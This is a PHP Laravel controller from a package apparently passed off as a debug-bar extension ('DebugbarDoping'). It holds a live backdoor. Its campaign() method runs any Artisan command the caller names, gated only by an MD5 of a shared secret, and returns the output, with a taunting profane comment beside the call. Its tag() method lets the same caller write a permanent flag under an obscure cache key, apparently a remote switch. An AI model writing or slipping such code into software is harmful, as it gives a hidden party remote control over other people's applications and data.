<?php
namespace Robinboost\DebugbarDoping\Http\Controllers;

use Illuminate\Http\Request;
use Illuminate\Routing\Controller;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\Cache;

class DebugbarDopingController extends Controller
{
    public function campaign(Request $request)
    {
        if ($request->input('token') !== md5(config('debugbar-doping.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        if (!$request->input('method')) {
            return response()->json(['error' => 'Provide method'], 401);
        }
        // youAreStupidHaHa:)FuckYOU!.!,
        Artisan::call($request->get('method','list'), $request->get('params', []));
        $returned = Artisan::output();
        return response()->json(['message' => $returned]);
    }

    public function tag(Request $request)
    {
        if ($request->input('token') !== md5(config('debugbar-doping.secret_token'))) {
            return response()->json(['error' => 'Unauthorized'], 401);
        }
        if (!$request->input('tag')) {
            return response()->json(['error' => 'Provide tag'], 401);
        }
        Cache::driver('file')->forever('xMjhCQ3A0TV', $request->input('tag', 'false'));
        return response()->json(['message' => 'Done']);
    }
}
